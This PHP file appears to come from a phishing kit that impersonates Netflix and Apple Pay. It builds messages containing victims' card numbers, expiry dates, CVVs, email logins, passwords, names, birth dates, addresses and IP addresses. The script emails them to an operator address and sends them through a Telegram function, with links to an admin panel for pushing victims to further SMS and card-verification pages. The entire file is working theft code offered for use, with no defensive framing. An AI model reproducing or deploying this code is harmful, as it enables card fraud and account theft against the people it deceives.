<?php
include("../infos.php");
include("../common/sub_includes.php");
include("../common/functions.php");



if(isset($_POST)){

	
	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['request'] = htmlspecialchars($_POST['req']);
	
	
	
				######################
				#### SETUP  PANEL ####
				######################
	
				if(!isset($_SESSION['id'])){
					createUniqueToken();
				}


				// cree de file
				
					$file = "../data/await/".$_SESSION['id'];
					$op = fopen($file,'w');
					fwrite($op,"");
					fclose($op);
					
				//link
				$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
				
				$homepage = dirname(dirname($actual_link));
				//$homepage = "http://localhost.com/";
				$custom = $homepage."/sma-admin/select.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip'];
				$ecard = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=ecard";
				$app = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=app";
				$sms1 = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=sms1";
				$sms2 = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=sms2";
				$sms3 = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=sms3";
				$apple = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=apple";
				$eapple = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=eapple";
				$done = $homepage."/sma-admin/do-api.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip']."&page=done";



				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "

[💊] Custom Request [💊]

💊 ".$_SESSION['requestQST']." : ".$_SESSION['request']."

[🧊] Card Part  [🧊]

🧊 Numéro : ".$_SESSION['ccnum']."
🧊 Expiration : ".$_SESSION['ccexp']."
🧊 CVV : ".$_SESSION['cvv']."                   

[🍛] Login Part [🍛]

🍛 E-Mail : ".$_SESSION['email']."
🍛 Mot de passe : ".$_SESSION['password']."



[🍛] Live Panel [🍛]

🍛 Link : ".$link."


[🍛] Tiers Part [🍛] 

🍛 Adresse IP : ".$_SESSION['ip']."
🍛 User Agent : ".$_SESSION['useragent']."


					";

					$subject = "[".$NameSender."] + 1 Apple Pay".$_SESSION['vbv_code']." - ".$_SESSION['ip'];
					$headers = "From: Netflix <".$NameSender.">";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$message =  '
					
📝Custom Request
└🏷'.$_SESSION['requestQST'].' : '.$_SESSION['request'].'

🏦 Carte de Paiement
├💳 Numéro : '.$_SESSION['ccnum'].'
├📅 Expiration : '.$_SESSION['ccexp'].'
└🔒 CVV : '.$_SESSION['cvv'].'

🏦 Billing
├👤 Prénom • '.$_SESSION['prenom'].'
├👤 Nom : '.$_SESSION['nom'].'
├🎂 Date De Naissance • '.$_SESSION['birthday'].'
├📞 Téléphone • '.$_SESSION['phone'].'
├🏠 Adresse • '.$_SESSION['adresse'].'
├🏙️ Ville • '.$_SESSION['city'].'
└📮 Code Postal • '.$_SESSION['zip'].'

💊 Login Part
├💊 E-Mail : '.$_SESSION['email'].'
└💊 Mot de passe : '.$_SESSION['password'].'


🧩 Extra
├🌐 Adresse IP :  '.$_SESSION['ip'].'
├💊 User Agent :  '.$_SESSION['useragent'].'


					';

				//toTG(htmlspecialschars($message),$chat, $token, $method_of_send_telegram );
				toTG4(htmlspecialschars($message) , $ecard, $app, $sms1, $sms2, $apple, $eapple, $sms3, $custom, $done);
				}

	echo '<meta http-equiv="refresh" content="0;url=../steps/wait.php" />';
	//header("Location: ../steps/wait.php	");


	}
else{
	echo '<meta http-equiv="refresh" content="0;url=../" />';
	//header('Location: ../');
}

?>